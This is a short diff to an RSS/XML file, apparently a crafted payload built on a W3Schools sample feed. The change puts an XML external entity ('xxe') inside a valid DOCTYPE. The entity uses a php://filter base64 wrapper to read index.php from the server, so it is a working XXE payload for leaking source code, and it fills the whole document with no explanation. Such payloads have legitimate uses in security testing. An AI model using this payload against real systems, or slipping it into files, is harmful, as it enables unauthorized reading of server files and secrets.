@@ -1,5 +1,7 @@
  <?xml version="1.0" encoding="UTF-8" ?>
-<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
